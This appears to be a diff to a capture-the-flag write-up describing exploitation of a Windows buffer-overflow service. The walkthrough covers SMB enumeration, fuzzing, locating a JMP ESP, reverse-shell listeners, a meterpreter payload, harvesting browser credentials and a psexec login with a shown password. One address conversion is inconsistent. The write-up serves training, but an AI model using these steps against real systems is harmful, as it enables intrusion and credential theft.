@@ -10,11 +10,11 @@
 nmap -A $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 ### **RPC/**TCP port 135
 
@@ -22,7 +22,7 @@ nmap -A $VICTIM
 rpcclient -U '' $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 ### **NetBIOS/**TCP port 139
 
@@ -30,7 +30,7 @@ rpcclient -U '' $VICTIM
 nbtscan $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 ### **SMB/**TCP port 445
 
@@ -44,24 +44,26 @@ smb: \> cd Share
 smb: \Share\> get gatekeeper.exe 
 ```
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-## Test Machine
+## Initial Shell
+
+### Test Machine
+
+As we have the .exe we're going to test on our Windows lab machine.
 
 ```
 xfreerdp /u:admin /p:password /cert:ignore /v:$TESTMACHINE /workarea  +clipboard
 python2 -m SimpleHTTPServer 81
 ```
 
-![](<../../.gitbook/assets/image (12).png>)
+![](<../../.gitbook/assets/image (15).png>)
 
 ### **Crash Replication & Controlling EIP**
-
-
 
 I crashed the program by sending 1000 As
 
@@ -70,7 +72,7 @@ python -c 'print("A"* 1000)'
 nc -v $TESTMACHINE 31337
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 **fuzzer.py**
 
@@ -116,7 +118,7 @@ The fuzzer didn't work as well as it did with other BOF problems. It kept sendin
 python fuzzer.py $VICTIM 1337
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 **exploit.py**
 
@@ -160,7 +162,7 @@ python exploit.py $VICTIM 1337
 
 
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding Bad Characters
 
@@ -226,15 +228,13 @@ except:
 
 
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 ### Finding a Jump Point
 
-Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. 0x08040000 is the only possible address to use but  SafeSEH is not disabled.
-
-essfunc.dll meets this criteria.&#x20;
+Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. 0x08040000 is the only possible address to use but SafeSEH is not disabled.
 
 **Immunity Debugger**
 
@@ -242,7 +242,7 @@ essfunc.dll meets this criteria.&#x20;
 !mona modules
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 We find that essfunc.dll has 2 possible JMP ESPs to use. So we will start with the first one which is 0x080414c3 but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.
 
@@ -252,7 +252,7 @@ We find that essfunc.dll has 2 possible JMP ESPs to use. So we will start with t
 !mona find -s "\xff\xe4" -m gatekeeper.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit - Staging
 
@@ -332,7 +332,7 @@ nc -lvnp 4444
 python exploit.py $TESTMACHINE 31337
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploit - Production
 
@@ -350,9 +350,7 @@ rlwrap nc -lvnp 4444
 python exploit.py $VICTIM 31337
 ```
 
-
-
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 I saw that the Victims OS is x64 and I wasn't able to run exes or powershell so I changed the payload. I first tried x64 payload but it wasn't working because it was to big so I switched to a meterpreter payload to avoid issues running commands.
 
@@ -441,11 +439,13 @@ python exploit.py $VICTIM 31337
 
 There wasn't much running on the server but I was able to see that firefox was running. Browsers can have credentials stored in them so I investigated further into this.
 
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
 ```
 meterpreter > run post/windows/gather/enum_applications
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 ### **Transfer WinPeas**
 
@@ -528,5 +528,5 @@ python3.9 /opt/impacket/build/scripts-3.9/psexec.py mayor@$VICTIM
 Password: 8CL7O1N78MdrCIsV
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
